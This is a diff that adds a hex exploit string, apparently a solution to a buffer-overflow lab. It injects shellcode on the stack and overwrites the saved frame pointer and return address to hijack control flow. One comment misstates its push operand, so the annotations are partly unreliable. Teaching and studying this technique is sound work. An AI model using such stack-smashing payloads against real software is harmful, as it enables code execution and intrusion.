@@ -1,0 +1,9 @@
+a1 08 d1 04 08 /* mov    0x804d108,%eax */
+bd b0 38 68 55 /* mov    $0x556838b0,%ebp */
+68 be 8d 04 08 /* push   $0x8048c9d */
+c3 /* ret */
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 58 38 68 55 /* using 0 and $ebp - 0x28 replace ebp and return address*/
